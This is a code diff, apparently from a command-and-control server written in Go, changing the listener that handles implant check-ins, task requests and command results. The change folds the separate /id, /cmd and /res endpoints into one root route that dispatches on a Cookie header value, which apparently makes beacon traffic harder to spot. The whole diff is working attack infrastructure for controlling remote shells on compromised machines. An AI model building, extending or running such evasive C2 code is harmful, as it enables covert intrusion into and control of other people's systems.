@@ -21,7 +21,7 @@ type Listener struct {
 	Key      []byte
 }
 
-func (l *Listener) CallBackHandler(w http.ResponseWriter, r *http.Request) {
+func (l *Listener) callBackHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.Header.Get("User-Agent")
 	body, err := io.ReadAll(r.Body)
 	if err != nil {
@@ -61,7 +61,7 @@ func (l *Listener) CallBackHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func (l *Listener) GetTasksHandler(w http.ResponseWriter, r *http.Request) {
+func (l *Listener) getTasksHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.Header.Get("User-Agent")
 	if shell, err := ShellMap.Get(id); shell == nil && err != nil {
 		host, _, _ := net.SplitHostPort(r.RemoteAddr)
@@ -93,7 +93,7 @@ func (l *Listener) GetTasksHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func (l *Listener) CheckinHandler(w http.ResponseWriter, r *http.Request) {
+func (l *Listener) checkinHandler(w http.ResponseWriter, r *http.Request) {
 	gofakeit.Seed(0)
 	noun := gofakeit.Noun()
 	adjective := gofakeit.Adjective()
@@ -110,6 +110,21 @@ func logRequest(handler http.Handler, log *log.Logger) http.Handler {
 	})
 }
 
+func (l *Listener) handler(w http.ResponseWriter, r *http.Request) {
+	if id := r.Header.Get("Cookie"); id != "" {
+		switch id {
+		case "ci":
+			l.checkinHandler(w, r)
+		case "gt":
+			l.getTasksHandler(w, r)
+		case "cb":
+			l.callBackHandler(w, r)
+		default:
+			return
+		}
+	}
+}
+
 func (l *Listener) StartListener() {
 	logFile, err := os.OpenFile("c2/data/listener.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -120,9 +135,7 @@ func (l *Listener) StartListener() {
 	errorLog := log.New(logFile, "ERROR: ", log.LstdFlags)
 	requestLog := log.New(logFile, "REQUEST: ", log.LstdFlags)
 
-	http.Handle("/id", logRequest(http.HandlerFunc(l.CheckinHandler), requestLog))
-	http.Handle("/cmd", logRequest(http.HandlerFunc(l.GetTasksHandler), requestLog))
-	http.Handle("/res", logRequest(http.HandlerFunc(l.CallBackHandler), requestLog))
+	http.Handle("/", logRequest(http.HandlerFunc(l.handler), requestLog))
 
 	server := &http.Server{
 		Addr:     ":" + l.Port,
